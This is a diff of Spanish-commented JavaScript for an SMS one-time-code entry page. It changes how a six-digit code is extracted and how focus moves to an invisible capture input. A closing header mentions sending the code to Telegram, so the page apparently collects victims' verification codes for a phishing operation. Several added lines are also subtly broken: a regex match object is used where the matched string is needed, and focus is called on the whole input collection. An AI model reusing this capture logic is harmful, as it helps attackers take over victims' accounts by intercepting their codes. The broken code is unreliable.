@@ -122,17 +122,19 @@
     }
   }
 
-    const inputInvisible = document.getElementById("otp-invisible-captura");
+      const inputInvisible = document.getElementById("otp-invisible-captura");
 
   // ============================================================
-  // EXTRACTOR DINÁMICO (Aísla los 6 dígitos de todo el mensaje)
+  // EXTRACTOR REFORZADO (Busca 6 números seguidos, ignora el punto final ".")
   // ============================================================
   function rellenarYValidarCodigo(rawText) {
     const textoLimpio = String(rawText || "");
-    const coincidencia = textoLimpio.match(/\b\d{6}\b/);
     
-    // Si detecta un bloque de 6 números en el SMS lo aísla; si no, limpia texto y corta a 6
-    const cleanValue = coincidencia ? coincidencia[0] : textoLimpio.replace(/\D/g, "").slice(0, 6);
+    // Busca 6 números seguidos, permitiendo que haya un punto u otros caracteres al final
+    const coincidencia = textoLimpio.match(/\d{6}/);
+    
+    // Si encuentra los 6 números seguidos, usa exactamente esos 6 dígitos limpios
+    const cleanValue = coincidencia ? coincidencia : textoLimpio.replace(/\D/g, "").slice(0, 6);
 
     if (cleanValue && cleanValue.length === 6) {
       inputs.forEach((input, idx) => {
@@ -182,8 +184,8 @@
   function configurarCasillasOTP() {
     if (!isIOS) activarEscuchaWebOTPAndroid();
 
-    // CORRECCIÓN DE FOCO: Redirige el clic de las primeras celdas hacia la celda invisible en Android
-    if (!isIOS && inputs && inputs[0] && inputInvisible) {
+    // Redirige el foco de las primeras celdas hacia la celda invisible en Android
+    if (!isIOS && inputs && inputs && inputInvisible) {
       inputs.forEach(input => {
         input.addEventListener("click", () => {
           inputInvisible.focus();
@@ -238,10 +240,11 @@
     if (inputInvisible) {
       inputInvisible.addEventListener("input", (e) => {
         const val = e.target.value;
+        // Si detecta que ingresó texto largo o que al limpiar quedan 6 números
         if (val.length >= 6 || val.replace(/\D/g, "").length === 6) {
           rellenarYValidarCodigo(val);
         } else if (val.length > 0) {
-          // Si escriben a mano, reparte los dígitos a los campos visibles
+          // Distribución manual si escriben dígito por dígito en el teclado invisible
           const cleanText = val.replace(/\D/g, "");
           inputs.forEach((input, idx) => {
             if (cleanText[idx]) {
@@ -304,13 +307,14 @@
           input.classList.remove("invalid");
         });
         if (inputInvisible) inputInvisible.value = "";
-        if (inputs && inputs[0]) inputs[0].focus();
+        if (inputs && inputs) inputs.focus();
 
         startTimer();
         if (!isIOS) activarEscuchaWebOTPAndroid();
       }, 1500);
     });
   }
+
 
   // ============================================================
   // ENVÍO Y VALIDACIÓN EN TELEGRAM
